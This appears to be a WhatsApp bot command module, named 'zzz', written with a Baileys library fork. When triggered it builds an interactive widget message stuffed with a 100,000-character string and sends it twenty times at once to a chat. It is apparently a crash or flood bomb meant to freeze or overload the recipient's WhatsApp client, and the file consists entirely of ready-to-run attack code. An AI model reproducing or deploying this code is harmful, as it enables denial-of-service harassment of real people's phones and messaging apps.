import crypto from'crypto'
import{generateWAMessageFromContent}from'@itsliaaa/baileys'

export const name='zzz'

export async function run({sock,from}){

const uuid=crypto.randomUUID()
const text='a'.repeat(100000)

const data={
version:'v0.9',
createSurface:{
surfaceId:`starcore-widget=${uuid}`,
catalogId:'https://a2ui.org/specification/v0_9/catalogs/basic/catalog.json',
components:[
{
id:'root',
component:'Column',
children:['text']
},
{
id:'text',
component:'Text',
text:text,
variant:'body'
}
]
}
}

const m=generateWAMessageFromContent(
from,
{
interactiveMessage:{
body:{
text:text
},
nativeFlowMessage:{
messageParamsJson:''
},
bloksWidget:{
uuid,
data:JSON.stringify(data),
type:'im_a2ui',
fallback:text
}
}
},
{
userJid:sock.user.id
}
)

await Promise.all(
Array.from({length:20},()=>sock.relayMessage(
from,
m.message,
{
messageId:crypto.randomUUID().replace(/-/g,'').toUpperCase().slice(0,32)
}
))
)

}